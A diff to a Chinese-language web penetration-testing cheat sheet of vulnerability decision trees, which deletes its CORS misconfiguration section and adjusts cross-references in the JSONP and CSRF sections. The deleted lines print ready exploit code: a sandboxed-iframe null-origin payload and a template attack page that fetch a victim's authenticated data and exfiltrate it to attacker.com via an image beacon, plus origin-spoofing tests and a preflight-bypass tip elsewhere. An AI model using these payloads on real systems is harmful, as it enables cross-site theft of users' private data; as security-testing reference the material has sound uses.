@@ -1,7 +1,7 @@
 # 漏洞决策树（精简版 — Payload + 数据联动）
 
 > 按需读取：匹配到参数特征后只读对应 §。格式：识别信号 → 决策流程 → Payload
-> 共 25 个决策树：§1 IDOR §2 支付 §3 文件上传 §4 SQLi §5 XSS §6 SSRF §7 XXE §8 未授权访问 §9 认证绕过 §10 逻辑缺陷 §11 RCE §12 并发竞争 §13 参数Fuzz §14 SSTI §15 NoSQL §16 Prototype Pollution §17 反序列化 §18 API联动 §19 OSS §20 CORS §21 JSONP §22 OAuth §23 泛查询/筛选绕过 §24 Open Redirect §25 CSRF
+> 按需读取：§1 IDOR §2 支付 §3 文件上传 §4 SQLi §5 XSS §6 SSRF §7 XXE §8 未授权访问 §9 认证绕过 §10 逻辑缺陷 §11 RCE §12 并发竞争 §13 参数Fuzz §14 SSTI §15 NoSQL §16 Prototype Pollution §17 反序列化 §18 API联动 §19 OSS §21 JSONP §22 OAuth §23 泛查询/筛选绕过 §24 Open Redirect §25 CSRF 等。
 
 ## §1 IDOR（越权）
 ### 识别信号
@@ -995,99 +995,6 @@ After obtaining AK/SK:
 
 *精简版 — 保留决策流程+Payload，移除冗余描述。~520行*
 
-## §20 CORS Misconfiguration
-
-### 识别信号
-- API response contains sensitive data (user info, tokens, private content)
-- Response headers include: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`
-
-### 决策流程
-```
-Response contains sensitive data?
-├── YES → Add Origin header: Origin: https://evil.com → resend
-│   ├── Response: Access-Control-Allow-Origin: https://evil.com
-│   │   + Access-Control-Allow-Credentials: true → CRITICAL CORS ✅
-│   ├── Response: Access-Control-Allow-Origin: null
-│   │   + Access-Control-Allow-Credentials: true → CRITICAL (exploitable via sandboxed iframe) ✅
-│   ├── Response: Access-Control-Allow-Origin: Null (capital N)
-│   │   + Access-Control-Allow-Credentials: true → NOT exploitable ❌
-│   ├── Response: Access-Control-Allow-Origin: *
-│   │   + Access-Control-Allow-Credentials: true → NOT_VULN (W3C标准: credentials为true时origin不能是*,
-│   │   浏览器直接拦截,无法跨域读取) ⚠️
-│   ├── Response: Access-Control-Allow-Origin: *
-│   │   (no credentials header) → NOT_VULN (公开数据,无需鉴权,无危害) ⚠️
-│   └── No CORS headers → NOT vulnerable ❌
-└── NO → Check for JSONP instead (§21)
-```
-
-### Payload
-```
-Test origins to try:
-Origin: https://evil.com
-Origin: https://target.com.evil.com  (suffix match bypass)
-Origin: https://evil.target.com      (prefix match bypass)
-Origin: null
-Origin: https://target.com           (same-origin to check reflection)
-
-CORS 3-part test:
-1. Does server reflect arbitrary Origin? → Origin: https://evil.com
-2. Is Access-Control-Allow-Credentials: true?
-3. Can you exploit from a browser? → host HTML on evil.com → fetch with credentials: 'include'
-```
-
-### Null Origin Exploit (for null+Credentials:true)
-```html
-<iframe sandbox="allow-scripts" srcdoc="
-  <script>
-    fetch('https://target.com/api/data', {credentials: 'include'})
-    .then(r => r.text())
-    .then(d => fetch('https://attacker.com/?c=' + btoa(d)));
-  </script>
-"></iframe>
-```
-
-### Full CORS Exploit PoC (Credentials + 未授权接口组合 — 通用模板)
-```html
-<!-- 部署在攻击者控制的网站上 -->
-<!-- 当受害者访问此页面时，自动窃取目标系统数据 -->
-<html><body><script>
-// Step 1: 窃取目标系统的业务数据（替换 {ENDPOINT}/{PARAMS} 为实际值）
-fetch('https://{TARGET}/{API_PREFIX}/{ENDPOINT}', {
-  method: '{HTTP_METHOD}',
-  headers: {'Content-Type': 'application/json'},
-  credentials: 'include',
-  body: JSON.stringify({ {PARAM_NAME}: '{PARAM_VALUE}' })
-}).then(r => r.json()).then(data => {
-  // Step 2: 将窃取的数据通过Image beacon外传到攻击者服务器
-  // (Image不会触发CORS预检，是静默数据外传的最佳方式)
-  new Image().src = 'https://attacker.com/collect?data=' + btoa(JSON.stringify(data));
-});
-
-// Step 3: 如果有Credentials且Token可重用，窃取所有需要认证的接口
-fetch('https://{TARGET}/{API_PREFIX}/{LIST_ENDPOINT}', {
-  method: '{HTTP_METHOD}',
-  headers: {'Content-Type': 'application/json'},
-  credentials: 'include',
-  body: JSON.stringify({pageNum:1, pageSize:100})
-}).then(r => r.json()).then(data => {
-  // 外传泄露的数据量
-  new Image().src = 'https://attacker.com/collect?d=' + btoa(JSON.stringify(data));
-});
-</script></body></html>
-```
-
-**三要素确认（一条curl验证）**：
-```bash
-curl -sk "https://target.com/api/endpoint" \
-  -X POST -H "Content-Type: application/json" \
-  -H "Origin: https://evil.com" \
-  -d '{}' -D - 2>&1 | grep -i access-control
-# 必须同时满足:
-#   Access-Control-Allow-Origin: https://evil.com (或 *)
-#   Access-Control-Allow-Credentials: true
-# 两者同时满足 = 可跨域窃取（严重）
-```
-
 ## §21 JSONP Hijacking
 
 ### 识别信号
@@ -1102,7 +1009,7 @@ Found callback parameter in API?
 │   ├── YES + response contains sensitive data → JSONP hijackable ✅
 │   │   └── Build exploit page with same callback function → steal data cross-origin
 │   ├── YES + requires auth token in URL → check if token is CSRF-protected
-│   └── NO → not JSONP, check CORS instead (§20)
+│   └── NO → not JSONP
 └── NO → Search JS for: callback, jsonp, jsoncallback
 ```
 
@@ -1457,7 +1364,7 @@ GraphQL:       查询参数/筛选字段 → 删除where条件/扩大limit
 - 状态变更请求(POST/PUT/DELETE)缺少不可预测 token
 - 参数：无 `csrf` `_token` `xsrf` `authenticity_token` `nonce` 或仅有可预测的值
 - Cookie: `SameSite=None` 或 `SameSite=Lax` + GET 敏感操作
-- 跨域请求未验证 `Origin`/`Referer` 头
+- 跨站状态变更请求未验证 `Origin`/`Referer` 头
 
 ### 决策流程
 ```
@@ -1483,7 +1390,7 @@ GraphQL:       查询参数/筛选字段 → 删除where条件/扩大limit
 │   → Origin: https://evil.com → 请求成功? → 仅依赖 Origin 或校验不严 → CSRF ✅
 │
 └── Step 5: Content-Type 绕过
-    → application/json → text/plain (绕过 CORS preflight)
+    → application/json → text/plain (绕过浏览器预检)
     → 表单数据 → JSON (如果服务端接受多种类型)
 ```
 
